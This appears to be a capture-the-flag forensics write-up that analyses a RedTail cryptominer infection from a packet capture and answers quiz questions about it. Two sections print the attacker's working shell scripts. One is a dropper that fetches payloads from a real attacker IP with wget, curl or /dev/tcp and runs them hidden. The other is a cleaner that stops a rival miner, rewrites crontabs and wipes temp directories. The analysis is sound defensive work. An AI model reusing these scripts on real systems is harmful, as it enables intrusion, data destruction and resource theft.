# Cuidado

## 1. What is the victim's IP address?

1. In `Statistics > HTTP > Requests`: `94.156.177.109` and its endpoints seem suspicious
2. Filtering `ip.addr == 94.156.177.109`, we see HTTP requests from `192.168.1.152` to `94.156.177.109`

> **ANSWER:** 192.168.1.152

## 2. What is the IP address of the attacker from whom the files were downloaded?

> **ANSWER:** 94.156.177.109

## 3. Which malicious file appears to be the first one downloaded?

Filter: `ip.addr == 192.168.1.152 && ip.addr == 94.156.177.109 && http`

> **ANSWER:** sh

## 4. What is the name of the function that the attacker used to download the payload?

`sh` content:

```sh
#!/bin/bash

dlr() {
  wget http://94.156.177.109/$1 || curl -O http://94.156.177.109/$1
  if [ $? -ne 0 ]; then
    exec 3<>"/dev/tcp/94.156.177.109/80"
    echo -e "GET /$1 HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3
    (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 >$1
    exec 3>&-
  fi
}

NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
EXCLUDE=""

for dir in $NOEXEC_DIRS; do
  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
done

FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \"/tmp/*\" -not -path \"/proc/*\" $EXCLUDE 2>/dev/null)
ARCH=$(uname -mp)
OK=true

for i in $FOLDERS /tmp /var/tmp /dev/shm; do
  if cd "$i" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >/dev/null 2>&1); then
    rm -rf .testfile .testfile2
    break
  fi
done

dlr clean
chmod +x clean
sh clean >/dev/null 2>&1
rm -rf clean

rm -rf .redtail
if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
  dlr x86_64
  mv x86_64 .redtail
elif echo "$ARCH" | grep -q "i[3456]86"; then
  dlr i686
  mv i686 .redtail
elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
  dlr aarch64
  mv aarch64 .redtail
elif echo "$ARCH" | grep -q "armv7"; then
  dlr arm7
  mv arm7 .redtail
else
  OK=false
  for a in x86_64 i686 aarch64 arm7; do
    dlr $a
    cat $a >.redtail
    chmod +x .redtail
    ./.redtail $1 >/dev/null 2>&1
    rm -rf $a
  done
fi

if [ $OK = true ]; then
  chmod +x .redtail
  ./.redtail $1 >/dev/null 2>&1
fi
```

> **ANSWER:** dlr

## 5. Which port does the attacker's server use?

> **ANSWER:** 80

## 6. The script checks which directories it can write to by attempting to create test files. What is the size of the second test file? (Size in MB)

```sh
  if cd "$i" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >/dev/null 2>&1); then
    rm -rf .testfile .testfile2
    break
  fi
```

> **ANSWER:** 2

## 7. What is the full command that the script uses to identify the CPU architecture?

> **ANSWER:** `uname -mp`

## 8. What is the name of the file that is downloaded after the CPU architecture is compared with reference values?

> **ANSWER:** `x86_64`

## 9. What is the full command that the attacker used to disable any existing mining service?

`clean` content:

```sh
#!/bin/bash

clean_crontab() {
  chattr -ia "$1"
  grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' "$1" >/tmp/clean_crontab
  mv /tmp/clean_crontab "$1"
}

systemctl disable c3pool_miner
systemctl stop c3pool_miner

chattr -ia /var/spool/cron/crontabs
for user_cron in /var/spool/cron/crontabs/*; do
  [ -f "$user_cron" ] && clean_crontab "$user_cron"
done

for system_cron in /etc/crontab /etc/crontabs; do
  [ -f "$system_cron" ] && clean_crontab "$system_cron"
done

for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
  chattr -ia "$dir"
  for system_cron in "$dir"/*; do
    [ -f "$system_cron" ] && clean_crontab "$system_cron"
  done
done

clean_crontab /etc/anacrontab

for i in /tmp /var/tmp /dev/shm; do
  rm -rf $i/*
done
```

> **ANSWER:** `systemctl disable c3pool_miner`

## 10. Apparently, the attacker used a packer to compress the malware. Which version of this packer was used? (Format X.XX)

```sh
$ strings x86_64 | grep UPX
$UPX!H
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 4.23 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $
UPX!
UPX!
```

> **ANSWER:** 4.23

## 11. What is the entropy value of unpacked malware?

```sh
$ upx -d x86_64
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.2       Markus Oberhumer, Laszlo Molnar & John Reiser   Jul 20th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   4671408 <-   1724832   36.92%   linux/amd64   x86_64

Unpacked 1 file.
```

```sh
$ ent x86_64
Entropy = 6.488449 bits per byte.

Optimum compression would reduce the size
of this 4671408 byte file by 18 percent.

Chi square distribution for 4671408 samples is 41756380.60, and randomly
would exceed this value less than 0.01 percent of the times.

Arithmetic mean value of data bytes is 92.3876 (127.5 = random).
Monte Carlo value for Pi is 3.414057603 (error 8.67 percent).
Serial correlation coefficient is 0.320703 (totally uncorrelated = 0.0).
```

> **ANSWER:** 6.488449

## 12. What is the file name with which the unpacked malware was submitted on VirusTotal?

```sh
$ sha256sum x86_64
61c128f1e5225e9d230d7fffa66468286c16fe622a7edee661fefe115698656c  x86_64
```

`https://www.virustotal.com/gui/file/61c128f1e5225e9d230d7fffa66468286c16fe622a7edee661fefe115698656c/details`

> **ANSWER:** `redtail.cuidado`

## 13. What MITRE ATT&CK technique ID is associated with the main purpose of the malware?

In VirusTotal `Behavior` tab > `MITRE ATT&CK Tactics and Techniques` > Impact > Resource Hijacking

> **ANSWER:** T1496
